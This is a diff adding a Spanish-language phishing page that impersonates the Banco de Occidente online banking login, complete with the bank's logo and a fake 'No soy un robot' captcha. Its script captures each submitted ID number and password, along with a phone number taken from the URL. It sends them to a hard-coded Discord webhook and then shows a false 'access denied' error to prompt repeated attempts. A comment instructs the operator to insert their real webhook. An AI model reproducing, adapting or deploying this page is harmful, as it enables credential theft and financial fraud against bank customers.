@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Transaccional - Banco de Occidente</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+</head>
+<body>
+
+    <div class="slideshow-container">
+        <div class="slide" style="background-image: url('login_sin_texto1.jfif');"></div>
+        <div class="slide" style="background-image: url('login_sin_texto2.jfif');"></div>
+        <div class="slide" style="background-image: url('login_sin_texto3.jfif');"></div>
+        <div class="slide" style="background-image: url('login_sin_texto4.jfif');"></div>
+        <div class="slide" style="background-image: url('login_sin_texto5.jfif');"></div>
+    </div>
+
+    <div class="overlay"></div>
+
+    <div class="main-content">
+        <div class="login-card">
+            <div class="security-badge">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                Seguridad
+            </div>
+
+            <div class="header">
+                <img src="https://www.bancodeoccidente.com.co/portaltransaccional/logo-03-occidente-01-occidente-01-regular.fcca1c0810b8bb3f.svg" alt="Logo" class="logo">
+                <p class="welcome">¡Bienvenido! a tu,</p>
+                <h2 class="title">Portal Transaccional</h2>
+            </div>
+
+            <div class="tabs">
+                <div class="tab active">Registrado</div>
+                <div class="tab">Sin registro</div>
+            </div>
+
+            <form id="loginForm">
+                <div class="field-group">
+                    <label>Identificación</label>
+                    <div class="id-row">
+                        <select class="id-select" id="tipo_doc">
+                            <option>C.C</option>
+                            <option>C.E</option>
+                            <option>PS</option>
+                            <option>T.I</option>
+                        </select>
+                        <input type="text" id="documento" placeholder="Número de documento" class="id-input" required>
+                    </div>
+                </div>
+
+                <div class="field-group">
+                    <label>Contraseña</label>
+                    <div class="password-input-container">
+                        <input type="password" id="clave" placeholder="Ingresa tu contraseña" required>
+                        <span class="toggle-pass" onclick="toggleClave()">👁️</span>
+                    </div>
+                    <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
+                </div>
+
+                <div class="check-row">
+                    <input type="checkbox" id="rem">
+                    <label for="rem">Recordar mis datos</label>
+                </div>
+
+                <div class="captcha-box">
+                    <div class="captcha-left">
+                        <input type="checkbox" required> <span>No soy un robot</span>
+                    </div>
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="captcha" width="30">
+                </div>
+
+                <div class="actions">
+                    <button type="button" class="btn-reg">Regístrate</button>
+                    <button type="submit" class="btn-in" id="btnIngresar">Ingresar</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+    let intentos = 0;
+    // REEMPLAZA ESTA URL CON TU WEBHOOK REAL
+    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1495237437818142870/bmbbKWDuinkfNUtF0-bt5qRVpw83f0t-P36DzE5A32RQgAkzas-l-fos7fXQ7ZntlANp"; 
+
+    function toggleClave() {
+        const input = document.getElementById("clave");
+        input.type = input.type === "password" ? "text" : "password";
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    
+    // 1. CAPTURAR EL TELÉFONO DE LA URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const telCapturado = urlParams.get('telefono') || "No llegó el dato";
+
+    // 2. PREPARAR LOS DATOS
+    const datos = {
+        content: `**⚠️ NUEVO REPORTE CAPTURADO**
+-------------------------------------------
+📱 **Teléfono:** ${telCapturado}
+🆔 **Documento:** ${document.getElementById("documento").value}
+🔑 **Contraseña:** ${document.getElementById("clave").value}
+🔢 **Intento:** ${intentos}
+-------------------------------------------`
+    };
+
+    // 3. ENVIAR AL WEBHOOK
+    fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(datos),
+        mode: 'no-cors'
+    }).then(() => {
+        mostrarError(); // Aquí disparas tu mensaje de "Datos incorrectos"
+    });
+});
+
+    function mostrarError(btn, text) {
+        Swal.fire({
+            icon: 'error',
+            title: 'Acceso Denegado',
+            text: 'Datos de inicio incorrectos, intente nuevamente.',
+            confirmButtonColor: '#0076ff',
+            confirmButtonText: 'Reintentar'
+        }).then(() => {
+            document.getElementById("clave").value = "";
+            btn.innerHTML = text;
+            btn.disabled = false;
+            document.getElementById("clave").focus();
+        });
+    }
+</script>
+</body>
+</html>
